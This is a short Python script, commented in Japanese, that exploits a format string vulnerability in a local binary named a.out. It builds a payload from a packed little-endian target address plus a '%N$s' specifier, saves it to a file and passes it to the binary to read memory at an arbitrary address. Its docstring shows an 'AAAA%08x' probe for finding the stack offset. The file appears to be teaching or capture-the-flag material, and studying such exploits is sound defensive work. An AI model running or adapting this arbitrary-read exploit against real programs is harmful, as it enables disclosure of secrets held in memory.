# -*- coding: utf-8 -*-
import sys
import struct
from subprocess import Popen

"""
入力
argv[1]:読み込みたい任意のアドレス
argv[2]:フォーマット文字列の先頭位置までのオフセット

出力
読み込みたい任意のアドレスに格納された値

※オフセットの確認方法
/a.out 'AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x'
先頭から数えて最初に41414141が出る所
"""

"""
標準入力の文字列を16進数として受け取りint型に変換
"""
target_address = int(sys.argv[1], 16)
index = int(sys.argv[2])

"""
数値をC言語のunsigned intかつリトルエンディアンとして扱えるように変換
"""
binary = struct.pack('<I', target_address)
binary += "%%%d$s" % index
with open('binary', 'wb') as f:
    f.write(binary)

p = Popen(['./a.out', binary])
p.wait()
